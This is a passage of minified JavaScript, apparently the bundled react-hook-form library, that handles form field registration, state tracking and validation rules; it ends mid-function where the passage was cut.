var Ue = e => !vt(e) && !Array.isArray(e) && sw(e) && !Zr(e)
  , iw = e => Ue(e) && e.target ? ra(e.target) ? e.target.checked : e.target.value : e
  , vC = e => e.substring(0, e.search(/\.\d+(\.|$)/)) || e
  , aw = (e, t) => e.has(vC(t))
  , gC = e => {
    const t = e.constructor && e.constructor.prototype;
    return Ue(t) && t.hasOwnProperty("isPrototypeOf")
}
  , Hf = typeof window < "u" && typeof window.HTMLElement < "u" && typeof document < "u";
function Et(e) {
    let t;
    const n = Array.isArray(e);
    if (e instanceof Date)
        t = new Date(e);
    else if (e instanceof Set)
        t = new Set(e);
    else if (!(Hf && (e instanceof Blob || e instanceof FileList)) && (n || Ue(e)))
        if (t = n ? [] : {},
        !n && !gC(e))
            t = e;
        else
            for (const r in e)
                e.hasOwnProperty(r) && (t[r] = Et(e[r]));
    else
        return e;
    return t
}
var hu = e => Array.isArray(e) ? e.filter(Boolean) : []
  , ze = e => e === void 0
  , V = (e, t, n) => {
    if (!t || !Ue(e))
        return n;
    const r = hu(t.split(/[,[\].]+?/)).reduce( (o, s) => vt(o) ? o : o[s], e);
    return ze(r) || r === e ? ze(e[t]) ? n : e[t] : r
}
  , Ht = e => typeof e == "boolean"
  , Wf = e => /^\w*$/.test(e)
  , lw = e => hu(e.replace(/["|']|\]/g, "").split(/\.|\[/))
  , Se = (e, t, n) => {
    let r = -1;
    const o = Wf(t) ? [t] : lw(t)
      , s = o.length
      , i = s - 1;
    for (; ++r < s; ) {
        const a = o[r];
        let l = n;
        if (r !== i) {
            const u = e[a];
            l = Ue(u) || Array.isArray(u) ? u : isNaN(+o[r + 1]) ? {} : []
        }
        if (a === "__proto__")
            return;
        e[a] = l,
        e = e[a]
    }
    return e
}
;
const Cl = {
    BLUR: "blur",
    FOCUS_OUT: "focusout",
    CHANGE: "change"
}
  , sn = {
    onBlur: "onBlur",
    onChange: "onChange",
    onSubmit: "onSubmit",
    onTouched: "onTouched",
    all: "all"
}
  , Mn = {
    max: "max",
    min: "min",
    maxLength: "maxLength",
    minLength: "minLength",
    pattern: "pattern",
    required: "required",
    validate: "validate"
}
  , uw = ie.createContext(null)
  , mu = () => ie.useContext(uw)
  , yC = e => {
    const {children: t, ...n} = e;
    return ie.createElement(uw.Provider, {
        value: n
    }, t)
}
;
var cw = (e, t, n, r=!0) => {
    const o = {
        defaultValues: t._defaultValues
    };
    for (const s in e)
        Object.defineProperty(o, s, {
            get: () => {
                const i = s;
                return t._proxyFormState[i] !== sn.all && (t._proxyFormState[i] = !r || sn.all),
                n && (n[i] = !0),
                e[i]
            }
        });
    return o
}
  , bt = e => Ue(e) && !Object.keys(e).length
  , dw = (e, t, n, r) => {
    n(e);
    const {name: o, ...s} = e;
    return bt(s) || Object.keys(s).length >= Object.keys(t).length || Object.keys(s).find(i => t[i] === (!r || sn.all))
}
  , si = e => Array.isArray(e) ? e : [e]
  , fw = (e, t, n) => !e || !t || e === t || si(e).some(r => r && (n ? r === t : r.startsWith(t) || t.startsWith(r)));
function Zf(e) {
    const t = ie.useRef(e);
    t.current = e,
    ie.useEffect( () => {
        const n = !e.disabled && t.current.subject && t.current.subject.subscribe({
            next: t.current.next
        });
        return () => {
            n && n.unsubscribe()
        }
    }
    , [e.disabled])
}
function wC(e) {
    const t = mu()
      , {control: n=t.control, disabled: r, name: o, exact: s} = e || {}
      , [i,a] = ie.useState(n._formState)
      , l = ie.useRef(!0)
      , u = ie.useRef({
        isDirty: !1,
        isLoading: !1,
        dirtyFields: !1,
        touchedFields: !1,
        validatingFields: !1,
        isValidating: !1,
        isValid: !1,
        errors: !1
    })
      , c = ie.useRef(o);
    return c.current = o,
    Zf({
        disabled: r,
        next: d => l.current && fw(c.current, d.name, s) && dw(d, u.current, n._updateFormState) && a({
            ...n._formState,
            ...d
        }),
        subject: n._subjects.state
    }),
    ie.useEffect( () => (l.current = !0,
    u.current.isValid && n._updateValid(!0),
    () => {
        l.current = !1
    }
    ), [n]),
    cw(i, n, u.current, !1)
}
var bn = e => typeof e == "string"
  , pw = (e, t, n, r, o) => bn(e) ? (r && t.watch.add(e),
V(n, e, o)) : Array.isArray(e) ? e.map(s => (r && t.watch.add(s),
V(n, s))) : (r && (t.watchAll = !0),
n);
function xC(e) {
    const t = mu()
      , {control: n=t.control, name: r, defaultValue: o, disabled: s, exact: i} = e || {}
      , a = ie.useRef(r);
    a.current = r,
    Zf({
        disabled: s,
        subject: n._subjects.values,
        next: c => {
            fw(a.current, c.name, i) && u(Et(pw(a.current, n._names, c.values || n._formValues, !1, o)))
        }
    });
    const [l,u] = ie.useState(n._getWatch(r, o));
    return ie.useEffect( () => n._removeUnmounted()),
    l
}
function SC(e) {
    const t = mu()
      , {name: n, disabled: r, control: o=t.control, shouldUnregister: s} = e
      , i = aw(o._names.array, n)
      , a = xC({
        control: o,
        name: n,
        defaultValue: V(o._formValues, n, V(o._defaultValues, n, e.defaultValue)),
        exact: !0
    })
      , l = wC({
        control: o,
        name: n,
        exact: !0
    })
      , u = ie.useRef(o.register(n, {
        ...e.rules,
        value: a,
        ...Ht(e.disabled) ? {
            disabled: e.disabled
        } : {}
    }));
    return ie.useEffect( () => {
        const c = o._options.shouldUnregister || s
          , d = (p, w) => {
            const x = V(o._fields, p);
            x && x._f && (x._f.mount = w)
        }
        ;
        if (d(n, !0),
        c) {
            const p = Et(V(o._options.defaultValues, n));
            Se(o._defaultValues, n, p),
            ze(V(o._formValues, n)) && Se(o._formValues, n, p)
        }
        return () => {
            (i ? c && !o._state.action : c) ? o.unregister(n) : d(n, !1)
        }
    }
    , [n, o, i, s]),
    ie.useEffect( () => {
        V(o._fields, n) && o._updateDisabledField({
            disabled: r,
            fields: o._fields,
            name: n,
            value: V(o._fields, n)._f.value
        })
    }
    , [r, n, o]),
    {
        field: {
            name: n,
            value: a,
            ...Ht(r) || l.disabled ? {
                disabled: l.disabled || r
            } : {},
            onChange: ie.useCallback(c => u.current.onChange({
                target: {
                    value: iw(c),
                    name: n
                },
                type: Cl.CHANGE
            }), [n]),
            onBlur: ie.useCallback( () => u.current.onBlur({
                target: {
                    value: V(o._formValues, n),
                    name: n
                },
                type: Cl.BLUR
            }), [n, o]),
            ref: ie.useCallback(c => {
                const d = V(o._fields, n);
                d && c && (d._f.ref = {
                    focus: () => c.focus(),
                    select: () => c.select(),
                    setCustomValidity: p => c.setCustomValidity(p),
                    reportValidity: () => c.reportValidity()
                })
            }
            , [o._fields, n])
        },
        formState: l,
        fieldState: Object.defineProperties({}, {
            invalid: {
                enumerable: !0,
                get: () => !!V(l.errors, n)
            },
            isDirty: {
                enumerable: !0,
                get: () => !!V(l.dirtyFields, n)
            },
            isTouched: {
                enumerable: !0,
                get: () => !!V(l.touchedFields, n)
            },
            isValidating: {
                enumerable: !0,
                get: () => !!V(l.validatingFields, n)
            },
            error: {
                enumerable: !0,
                get: () => V(l.errors, n)
            }
        })
    }
}
const _C = e => e.render(SC(e));
var hw = (e, t, n, r, o) => t ? {
    ...n[e],
    types: {
        ...n[e] && n[e].types ? n[e].types : {},
        [r]: o || !0
    }
} : {}
  , qh = e => ({
    isOnSubmit: !e || e === sn.onSubmit,
    isOnBlur: e === sn.onBlur,
    isOnChange: e === sn.onChange,
    isOnAll: e === sn.all,
    isOnTouch: e === sn.onTouched
})
  , Gh = (e, t, n) => !n && (t.watchAll || t.watch.has(e) || [...t.watch].some(r => e.startsWith(r) && /^\.\w+/.test(e.slice(r.length))));
const ii = (e, t, n, r) => {
    for (const o of n || Object.keys(e)) {
        const s = V(e, o);
        if (s) {
            const {_f: i, ...a} = s;
            if (i) {
                if (i.refs && i.refs[0] && t(i.refs[0], o) && !r)
                    return !0;
                if (i.ref && t(i.ref, i.name) && !r)
                    return !0;
                if (ii(a, t))
                    break
            } else if (Ue(a) && ii(a, t))
                break
        }
    }
}
;
var EC = (e, t, n) => {
    const r = si(V(e, n));
    return Se(r, "root", t[n]),
    Se(e, n, r),
    e
}
  , Kf = e => e.type === "file"
  , Bn = e => typeof e == "function"
  , kl = e => {
    if (!Hf)
        return !1;
    const t = e ? e.ownerDocument : 0;
    return e instanceof (t && t.defaultView ? t.defaultView.HTMLElement : HTMLElement)
}
  , Qa = e => bn(e)
  , Qf = e => e.type === "radio"
  , Tl = e => e instanceof RegExp;
const Yh = {
    value: !1,
    isValid: !1
}
  , Xh = {
    value: !0,
    isValid: !0
};
var mw = e => {
    if (Array.isArray(e)) {
        if (e.length > 1) {
            const t = e.filter(n => n && n.checked && !n.disabled).map(n => n.value);
            return {
                value: t,
                isValid: !!t.length
            }
        }
        return e[0].checked && !e[0].disabled ? e[0].attributes && !ze(e[0].attributes.value) ? ze(e[0].value) || e[0].value === "" ? Xh : {
            value: e[0].value,
            isValid: !0
        } : Xh : Yh
    }
    return Yh
}
;
const Jh = {
    isValid: !1,
    value: null
};
var vw = e => Array.isArray(e) ? e.reduce( (t, n) => n && n.checked && !n.disabled ? {
    isValid: !0,
    value: n.value
} : t, Jh) : Jh;
function em(e, t, n="validate") {
    if (Qa(e) || Array.isArray(e) && e.every(Qa) || Ht(e) && !e)
        return {
            type: n,
            message: Qa(e) ? e : "",
            ref: t
        }
}
var xo = e => Ue(e) && !Tl(e) ? e : {
    value: e,
    message: ""
}
  , tm = async (e, t, n, r, o) => {
    const {ref: s, refs: i, required: a, maxLength: l, minLength: u, min: c, max: d, pattern: p, validate: w, name: x, valueAsNumber: m, mount: S, disabled: v} = e._f
      , f = V(t, x);
    if (!S || v)
        return {};
    const y = i ? i[0] : s
      , _ = O => {
        r && y.reportValidity && (y.setCustomValidity(Ht(O) ? "" : O || ""),
        y.reportValidity())
    }
      , b = {}
      , T = Qf(s)
      , k = ra(s)
      , P = T || k
      , z = (m || Kf(s)) && ze(s.value) && ze(f) || kl(s) && s.value === "" || f === "" || Array.isArray(f) && !f.length
      , L = hw.bind(null, x, n, b)
      , X = (O, U, j, q=Mn.maxLength, K=Mn.minLength) => {
        const Y = O ? U : j;
        b[x] = {
            type: O ? q : K,
            message: Y,
            ref: s,
            ...L(O ? q : K, Y)
        }
    }
    ;
    if (o ? !Array.isArray(f) || !f.length : a && (!P && (z || vt(f)) || Ht(f) && !f || k && !mw(i).isValid || T && !vw(i).isValid)) {
        const {value: O, message: U} = Qa(a) ? {
            value: !!a,
            message: a
        } : xo(a);
        if (O && (b[x] = {
            type: Mn.required,
            message: U,
            ref: y,
            ...L(Mn.required, U)
        },
        !n))
            return _(U),
            b
    }
    if (!z && (!vt(c) || !vt(d))) {
        let O, U;
        const j = xo(d)
          , q = xo(c);
        if (!vt(f) && !isNaN(f)) {
            const K = s.valueAsNumber || f && +f;
            vt(j.value) || (O = K > j.value),
            vt(q.value) || (U = K < q.value)
        } else {
            const K = s.valueAsDate || new Date(f)
              , Y = Q => new Date(new Date().toDateString() + " " + Q)
              , N = s.type == "time"
              , F = s.type == "week";
            bn(j.value) && f && (O = N ? Y(f) > Y(j.value) : F ? f > j.value : K > new Date(j.value)),
            bn(q.value) && f && (U = N ? Y(f) < Y(q.value) : F ? f < q.value : K < new Date(q.value))
        }
        if ((O || U) && (X(!!O, j.message, q.message, Mn.max, Mn.min),
        !n))
            return _(b[x].message),
            b
    }
    if ((l || u) && !z && (bn(f) || o && Array.isArray(f))) {
        const O = xo(l)
          , U = xo(u)
          , j = !vt(O.value) && f.length > +O.value
          , q = !vt(U.value) && f.length < +U.value;
        if ((j || q) && (X(j, O.message, U.message),
        !n))
            return _(b[x].message),
            b
    }
    if (p && !z && bn(f)) {
        const {value: O, message: U} = xo(p);
        if (Tl(O) && !f.match(O) && (b[x] = {
            type: Mn.pattern,
            message: U,
            ref: s,
            ...L(Mn.pattern, U)
        },
        !n))
            return _(U),
            b
    }
    if (w) {
        if (Bn(w)) {
            const O = await w(f, t)
              , U = em(O, y);
            if (U && (b[x] = {
                ...U,
                ...L(Mn.validate, U.message)
            },
            !n))
                return _(U.message),
                b
        } else if (Ue(w)) {
            let O = {};
            for (const U in w) {
                if (!bt(O) && !n)
                    break;
                const j = em(await w[U](f, t), y, U);
                j && (O = {
                    ...j,
                    ...L(U, j.message)
                },
                _(j.message),
                n && (b[x] = O))
            }
            if (!bt(O) && (b[x] = {
                ref: y,
                ...O
            },
            !n))
                return b
        }
    }
    return _(!0),
    b
}
;
function bC(e, t) {
    const n = t.slice(0, -1).length;
    let r = 0;
    for (; r < n; )
        e = ze(e) ? r++ : e[t[r++]];
    return e
}
function CC(e) {
    for (const t in e)
        if (e.hasOwnProperty(t) && !ze(e[t]))
            return !1;
    return !0
}
function Ke(e, t) {
    const n = Array.isArray(t) ? t : Wf(t) ? [t] : lw(t)
      , r = n.length === 1 ? e : bC(e, n)
      , o = n.length - 1
      , s = n[o];
    return r && delete r[s],
    o !== 0 && (Ue(r) && bt(r) || Array.isArray(r) && CC(r)) && Ke(e, n.slice(0, -1)),
    e
}
var ic = () => {
    let e = [];
    return {
        get observers() {
            return e
        },
        next: o => {
            for (const s of e)
                s.next && s.next(o)
        }
        ,
        subscribe: o => (e.push(o),
        {
            unsubscribe: () => {
                e = e.filter(s => s !== o)
            }
        }),
        unsubscribe: () => {
            e = []
        }
    }
}
  , wd = e => vt(e) || !sw(e);
function lr(e, t) {
    if (wd(e) || wd(t))
        return e === t;
    if (Zr(e) && Zr(t))
        return e.getTime() === t.getTime();
    const n = Object.keys(e)
      , r = Object.keys(t);
    if (n.length !== r.length)
        return !1;
    for (const o of n) {
        const s = e[o];
        if (!r.includes(o))
            return !1;
        if (o !== "ref") {
            const i = t[o];
            if (Zr(s) && Zr(i) || Ue(s) && Ue(i) || Array.isArray(s) && Array.isArray(i) ? !lr(s, i) : s !== i)
                return !1
        }
    }
    return !0
}
var gw = e => e.type === "select-multiple"
  , kC = e => Qf(e) || ra(e)
  , ac = e => kl(e) && e.isConnected
  , yw = e => {
    for (const t in e)
        if (Bn(e[t]))
            return !0;
    return !1
}
;
function Pl(e, t={}) {
    const n = Array.isArray(e);
    if (Ue(e) || n)
        for (const r in e)
            Array.isArray(e[r]) || Ue(e[r]) && !yw(e[r]) ? (t[r] = Array.isArray(e[r]) ? [] : {},
            Pl(e[r], t[r])) : vt(e[r]) || (t[r] = !0);
    return t
}
function ww(e, t, n) {
    const r = Array.isArray(e);
    if (Ue(e) || r)
        for (const o in e)
            Array.isArray(e[o]) || Ue(e[o]) && !yw(e[o]) ? ze(t) || wd(n[o]) ? n[o] = Array.isArray(e[o]) ? Pl(e[o], []) : {
                ...Pl(e[o])
            } : ww(e[o], vt(t) ? {} : t[o], n[o]) : n[o] = !lr(e[o], t[o]);
    return n
}
var Fs = (e, t) => ww(e, t, Pl(t))
  , xw = (e, {valueAsNumber: t, valueAsDate: n, setValueAs: r}) => ze(e) ? e : t ? e === "" ? NaN : e && +e : n && bn(e) ? new Date(e) : r ? r(e) : e;
function lc(e) {
    const t = e.ref;
    if (!(e.refs ? e.refs.every(n => n.disabled) : t.disabled))
        return Kf(t) ? t.files : Qf(t) ? vw(e.refs).value : gw(t) ? [...t.selectedOptions].map( ({value: n}) => n) : ra(t) ? mw(e.refs).value : xw(ze(t.value) ? e.ref.value : t.value, e)
}
var TC = (e, t, n, r) => {
    const o = {};
    for (const s of e) {
        const i = V(t, s);
        i && Se(o, s, i._f)
    }
    return {
        criteriaMode: n,
        names: [...e],
        fields: o,
        shouldUseNativeValidation: r
    }
}
  , Vs = e => ze(e) ? e : Tl(e) ? e.source : Ue(e) ? Tl(e.value) ? e.value.source : e.value : e;
const nm = "AsyncFunction";
var PC = e => (!e || !e.validate) && !!(Bn(e.validate) && e.validate.constructor.name === nm || Ue(e.validate) && Object.values(e.validate).find(t => t.constructor.name === nm))
  , NC = e => e.mount && (e.required || e.min || e.max || e.maxLength || e.minLength || e.pattern || e.validate);
function rm(e, t, n) {
    const r = V(e, n);
    if (r || Wf(n))
        return {
            error: r,
            name: n
        };
    const o = n.split(".");
    for (; o.length; ) {
        const s = o.join(".")
          , i = V(t, s)
          , a = V(e, s);
        if (i && !Array.isArray(i) && n !== s)
            return {
                name: n
            };
        if (a && a.type)
            return {
                name: s,
                error: a
            };
        o.pop()
    }
    return {
        name: n
    }
}
var RC = (e, t, n, r, o) => o.isOnAll ? !1 : !n && o.isOnTouch ? !(t || e) : (n ? r.isOnBlur : o.isOnBlur) ? !e : (n ? r.isOnChange : o.isOnChange) ? e : !0
  , AC = (e, t) => !hu(V(e, t)).length && Ke(e, t);
const OC = {
    mode: sn.onSubmit,
    reValidateMode: sn.onChange,
    shouldFocusError: !0
};
function jC(e={}) {
    let t = {
        ...OC,
        ...e
    }, n = {
        submitCount: 0,
        isDirty: !1,
        isLoading: Bn(t.defaultValues),
        isValidating: !1,
        isSubmitted: !1,
        isSubmitting: !1,
        isSubmitSuccessful: !1,
        isValid: !1,
        touchedFields: {},
        dirtyFields: {},
        validatingFields: {},
        errors: t.errors || {},
        disabled: t.disabled || !1
    }, r = {}, o = Ue(t.defaultValues) || Ue(t.values) ? Et(t.defaultValues || t.values) || {} : {}, s = t.shouldUnregister ? {} : Et(o), i = {
        action: !1,
        mount: !1,
        watch: !1
    }, a = {
        mount: new Set,
        unMount: new Set,
        array: new Set,
        watch: new Set
    }, l, u = 0;
    const c = {
        isDirty: !1,
        dirtyFields: !1,
        validatingFields: !1,
        touchedFields: !1,
        isValidating: !1,
        isValid: !1,
        errors: !1
    }
      , d = {
        values: ic(),
        array: ic(),
        state: ic()
    }
      , p = qh(t.mode)
      , w = qh(t.reValidateMode)
      , x = t.criteriaMode === sn.all
      , m = E => C => {
        clearTimeout(u),
        u = setTimeout(E, C)
    }
      , S = async E => {
        if (!e.disabled && (c.isValid || E)) {
            const C = t.resolver ? bt((await P()).errors) : await L(r, !0);
            C !== n.isValid && d.state.next({
                isValid: C
            })
        }
    }
      , v = (E, C) => {
        !e.disabled && (c.isValidating || c.validatingFields) && ((E || Array.from(a.mount)).forEach(R => {
            R && (C ? Se(n.validatingFields, R, C) : Ke(n.validatingFields, R))
        }
        ),
        d.state.next({
            validatingFields: n.validatingFields,
            isValidating: !bt(n.validatingFields)
        }))
    }
      , f = (E, C=[], R, H, $=!0, D=!0) => {
        if (H && R && !e.disabled) {
            if (i.action = !0,
            D && Array.isArray(V(r, E))) {
                const ee = R(V(r, E), H.argA, H.argB);
                $ && Se(r, E, ee)
            }
            if (D && Array.isArray(V(n.errors, E))) {
                const ee = R(V(n.errors, E), H.argA, H.argB);
                $ && Se(n.errors, E, ee),
                AC(n.errors, E)
            }
            if (c.touchedFields && D && Array.isArray(V(n.touchedFields, E))) {
                const ee = R(V(n.touchedFields, E), H.argA, H.argB);
                $ && Se(n.touchedFields, E, ee)
            }
            c.dirtyFields && (n.dirtyFields = Fs(o, s)),
            d.state.next({
                name: E,
                isDirty: O(E, C),
                dirtyFields: n.dirtyFields,
                errors: n.errors,
                isValid: n.isValid
            })
        } else
            Se(s, E, C)
    }
      , y = (E, C) => {
        Se(n.errors, E, C),
        d.state.next({
            errors: n.errors
        })
    }
      , _ = E => {
        n.errors = E,
        d.state.next({
            errors: n.errors,
            isValid: !1
        })
    }
      , b = (E, C, R, H) => {
        const $ = V(r, E);
        if ($) {
            const D = V(s, E, ze(R) ? V(o, E) : R);
            ze(D) || H && H.defaultChecked || C ? Se(s, E, C ? D : lc($._f)) : q(E, D),
            i.mount && S()
        }
    }
      , T = (E, C, R, H, $) => {
        let D = !1
          , ee = !1;
        const ce = {
            name: E
        };
        if (!e.disabled) {
            const Ge = !!(V(r, E) && V(r, E)._f && V(r, E)._f.disabled);
            if (!R || H) {
                c.isDirty && (ee = n.isDirty,
                n.isDirty = ce.isDirty = O(),
                D = ee !== ce.isDirty);
                const Ye = Ge || lr(V(o, E), C);
                ee = !!(!Ge && V(n.dirtyFields, E)),
                Ye || Ge ? Ke(n.dirtyFields, E) : Se(n.dirtyFields, E, !0),
                ce.dirtyFields = n.dirtyFields,
                D = D || c.dirtyFields && ee !== !Ye
            }
            if (R) {
                const Ye = V(n.touchedFields, E);
                Ye || (Se(n.touchedFields, E, R),
                ce.touchedFields = n.touchedFields,
                D = D || c.touchedFields && Ye !== R)
            }
            D && $ && d.state.next(ce)
        }
        return D ? ce : {}
    }
      , k = (E, C, R, H) => {
        const $ = V(n.errors, E)
          , D = c.isValid && Ht(C) && n.isValid !== C;
        if (e.delayError && R ? (l = m( () => y(E, R)),
        l(e.delayError)) : (clearTimeout(u),
        l = null,
        R ? Se(n.errors, E, R) : Ke(n.errors, E)),
        (R ? !lr($, R) : $) || !bt(H) || D) {
            const ee = {
                ...H,
                ...D && Ht(C) ? {
                    isValid: C
                } : {},
                errors: n.errors,
                name: E
            };
            n = {
                ...n,
                ...ee
            },
            d.state.next(ee)
        }
    }
      , P = async E => {
        v(E, !0);
        const C = await t.resolver(s, t.context, TC(E || a.mount, r, t.criteriaMode, t.shouldUseNativeValidation));
        return v(E),
        C
    }
      , z = async E => {
        const {errors: C} = await P(E);
        if (E)
            for (const R of E) {
                const H = V(C, R);
                H ? Se(n.errors, R, H) : Ke(n.errors, R)
            }
        else
            n.errors = C;
        return C
    }
      , L = async (E, C, R={
        valid: !0
    }) => {
        for (const H in E) {
            const $ = E[H];
            if ($) {
                const {_f: D, ...ee} = $;
                if (D) {
                    const ce = a.array.has(D.name)
                      , Ge = $._f && PC($._f);
                    Ge && c.validatingFields && v([H], !0);
                    const Ye = await tm($, s, x, t.shouldUseNativeValidation && !C, ce);
                    if (Ge && c.validatingFields && v([H]),
                    Ye[D.name] && (R.valid = !1,
                    C))
                        break;
                    !C && (V(Ye, D.name) ? ce ? EC(n.errors, Ye, D.name) : Se(n.errors, D.name, Ye[D.name]) : Ke(n.errors, D.name))
                }
                !bt(ee) && await L(ee, C, R)
            }
        }
        return R.valid
    }
      , X = () => {
        for (const E of a.unMount) {
            const C = V(r, E);
            C && (C._f.refs ? C._f.refs.every(R => !ac(R)) : !ac(C._f.ref)) && We(E)
        }
        a.unMount = new Set
    }
      , O = (E, C) => !e.disabled && (E && C && Se(s, E, C),
    !lr(re(), o))
      , U = (E, C, R) => pw(E, a, {
        ...i.mount ? s : ze(C) ? o : bn(E) ? {
            [E]: C
        } : C
    }, R, C)
      , j = E => hu(V(i.mount ? s : o, E, e.shouldUnregister ? V(o, E, []) : []))
      , q = (E, C, R={}) => {
        const H = V(r, E);
        let $ = C;
        if (H) {
            const D = H._f;
            D && (!D.disabled && Se(s, E, xw(C, D)),
            $ = kl(D.ref) && vt(C) ? "" : C,
            gw(D.ref) ? [...D.ref.options].forEach(ee => ee.selected = $.includes(ee.value)) : D.refs ? ra(D.ref) ? D.refs.length > 1 ? D.refs.forEach(ee => (!ee.defaultChecked || !ee.disabled) && (ee.checked = Array.isArray($) ? !!$.find(ce => ce === ee.value) : $ === ee.value)) : D.refs[0] && (D.refs[0].checked = !!$) : D.refs.forEach(ee => ee.checked = ee.value === $) : Kf(D.ref) ? D.ref.value = "" : (D.ref.value = $,
            D.ref.type || d.values.next({
                name: E,
                values: {
                    ...s
                }
            })))
        }
        (R.shouldDirty || R.shouldTouch) && T(E, $, R.shouldTouch, R.shouldDirty, !0),
        R.shouldValidate && Q(E)
    }
      , K = (E, C, R) => {
        for (const H in C) {
            const $ = C[H]
              , D = `${E}.${H}`
              , ee = V(r, D);
            (a.array.has(E) || Ue($) || ee && !ee._f) && !Zr($) ? K(D, $, R) : q(D, $, R)
        }
    }
      , Y = (E, C, R={}) => {
        const H = V(r, E)
          , $ = a.array.has(E)
          , D = Et(C);
        Se(s, E, D),
        $ ? (d.array.next({
            name: E,
            values: {
                ...s
            }
        }),
        (c.isDirty || c.dirtyFields) && R.shouldDirty && d.state.next({
            name: E,
            dirtyFields: Fs(o, s),
            isDirty: O(E, D)
        })) : H && !H._f && !vt(D) ? K(E, D, R) : q(E, D, R),
        Gh(E, a) && d.state.next({
            ...n
        }),
        d.values.next({
            name: i.mount ? E : void 0,
            values: {
                ...s
            }
        })
    }
      , N = async E => {
        i.mount = !0;
        const C = E.target;
        let R = C.name
          , H = !0;
        const $ = V(r, R)
          , D = () => C.type ? lc($._f) : iw(E)
          , ee = ce => {
            H = Number.isNaN(ce) || Zr(ce) && isNaN(ce.getTime()) || lr(ce, V(s, R, ce))
        }
        ;
        if ($) {
            let ce, Ge;
            const Ye = D()
              , zr = E.type === Cl.BLUR || E.type === Cl.FOCUS_OUT
              , H0 = !NC($._f) && !t.resolver && !V(n.errors, R) && !$._f.deps || RC(zr, V(n.touchedFields, R), n.isSubmitted, w, p)
              , Cu = Gh(R, a, zr);
            Se(s, R, Ye),
            zr ? ($._f.onBlur && $._f.onBlur(E),
            l && l(0)) : $._f.onChange && $._f.onChange(E);
            const ku = T(R, Ye, zr, !1)
              , W0 = !bt(ku) || Cu;
            if (!zr && d.values.next({
                name: R,
                type: E.type,
                values: {
                    ...s
                }
            }),
            H0)
                return c.isValid && (e.mode === "onBlur" ? zr && S() : S()),
                W0 && d.state.next({
                    name: R,
                    ...Cu ? {} : ku
                });
            if (!zr && Cu && d.state.next({
                ...n
            }),
            t.resolver) {
                const {errors: gp} = await P([R]);
                if (ee(Ye),
                H) {
                    const Z0 = rm(n.errors, r, R)
                      , yp = rm(gp, r, Z0.name || R);
                    ce = yp.error,
                    R = yp.name,
                    Ge = bt(gp)
                }
            } else
                v([R], !0),
                ce = (await tm($, s, x, t.shouldUseNativeValidation))[R],
                v([R]),
                ee(Ye),
                H && (ce ? Ge = !1 : c.isValid && (Ge = await L(r, !0)));
            H && ($._f.deps && Q($._f.deps),
            k(R, Ge, ce, ku))
        }
    }
      , F = (E, C) => {
        if (V(n.errors, C) && E.focus)
            return E.focus(),
            1
    }
      , Q = async (E, C={}) => {
        let R, H;
        const $ = si(E);
        if (t.resolver) {
            const D = await z(ze(E) ? E : $);
            R = bt(D),
            H = E ? !$.some(ee => V(D, ee)) : R
        } else
            E ? (H = (await Promise.all($.map(async D => {
                const ee = V(r, D);
                return await L(ee && ee._f ? {
                    [D]: ee
                } : ee)
            }
            ))).every(Boolean),
            !(!H && !n.isValid) && S()) : H = R = await L(r);
        return d.state.next({
            ...!bn(E) || c.isValid && R !== n.isValid ? {} : {
                name: E
            },
            ...t.resolver || !E ? {
                isValid: R
            } : {},
            errors: n.errors
        }),
        C.shouldFocus && !H && ii(r, F, E ? $ : a.mount),
        H
    }
      , re = E => {
        const C = {
            ...i.mount ? s : o
        };
        return ze(E) ? C : bn(E) ? V(C, E) : E.map(R => V(C, R))
    }
      , ye = (E, C) => ({
        invalid: !!V((C || n).errors, E),
        isDirty: !!V((C || n).dirtyFields, E),
        error: V((C || n).errors, E),
        isValidating: !!V(n.validatingFields, E),
        isTouched: !!V((C || n).touchedFields, E)
    })
      , et = E => {
        E && si(E).forEach(C => Ke(n.errors, C)),
        d.state.next({
            errors: E ? n.errors : {}
        })
    }
      , De = (E, C, R) => {
        const H = (V(r, E, {
            _f: {}
        })._f || {}).ref
          , $ = V(n.errors, E) || {}
          , {ref: D, message: ee, type: ce, ...Ge} = $;
        Se(n.errors, E, {
            ...Ge,
            ...C,
            ref: H
        }),
        d.state.next({
            name: E,
            errors: n.errors,
            isValid: !1
        }),
        R && R.shouldFocus && H && H.focus && H.focus()
    }
      , Ut = (E, C) => Bn(E) ? d.values.subscribe({
        next: R => E(U(void 0, C), R)
    }) : U(E, C, !0)
      , We = (E, C={}) => {
        for (const R of E ? si(E) : a.mount)
            a.mount.delete(R),
            a.array.delete(R),
            C.keepValue || (Ke(r, R),
            Ke(s, R)),
            !C.keepError && Ke(n.errors, R),
            !C.keepDirty && Ke(n.dirtyFields, R),
            !C.keepTouched && Ke(n.touchedFields, R),
            !C.keepIsValidating && Ke(n.validatingFields, R),
            !t.shouldUnregister && !C.keepDefaultValue && Ke(o, R);
        d.values.next({
            values: {
                ...s
            }
        }),
        d.state.next({
            ...n,
            ...C.keepDirty ? {
                isDirty: O()
            } : {}
        }),
        !C.keepIsValid && S()
    }
      , J = ({disabled: E, name: C, field: R, fields: H, value: $}) => {
        if (Ht(E) && i.mount || E) {
            const D = E ? void 0 : ze($) ? lc(R ? R._f : V(H, C)._f) : $;
            Se(s, C, D),
            T(C, D, !1, !1, !0)
        }
    }
      , _e = (E, C={}) => {
        let R = V(r, E);
        const H = Ht(C.disabled) || Ht(e.disabled);
        return Se(r, E, {
            ...R || {},
            _f: {
                ...R && R._f ? R._f : {
                    ref: {
                        name: E
                    }
                },
                name: E,
                mount: !0,
                ...C
            }
        }),
        a.mount.add(E),
        R ? J({
            field: R,
            disabled: Ht(C.disabled) ? C.disabled : e.disabled,
            name: E,
            value: C.value
        }) : b(E, !0, C.value),
        {
            ...H ? {
                disabled: C.disabled || e.disabled
            } : {},
            ...t.progressive ? {
                required: !!C.required,
                min: Vs(C.min),
                max: Vs(C.max),
                minLength: Vs(C.minLength),
                maxLength: Vs(C.maxLength),
                pattern: Vs(C.pattern)
            } : {},
            name: E,
            onChange: N,
            onBlur: N,
            ref: $ => {
                if ($) {
                    _e(E, C),
                    R = V(r, E);
                    const D = ze($.value) && $.querySelectorAll && $.querySelectorAll("input,select,textarea")[0] || $
                      , ee = kC(D)
                      , ce = R._f.refs || [];
                    if (ee ? ce.find(Ge => Ge === D) : D === R._f.ref)
                        return;
                    Se(r, E, {
                        _f: {
                            ...R._f,
                            ...ee ? {
                                refs: [...ce.filter(ac), D, ...Array.isArray(V(o, E)) ? [{}] : []],
                                ref: {
                                    type: D.type,
                                    name: E
                                }
                            } : {
                                ref: D
                            }
                        }
                    }),
                    b(E, !1, void 0, D)
                } else
                    R = V(r, E, {}),
                    R._f && (R._f.mount = !1),
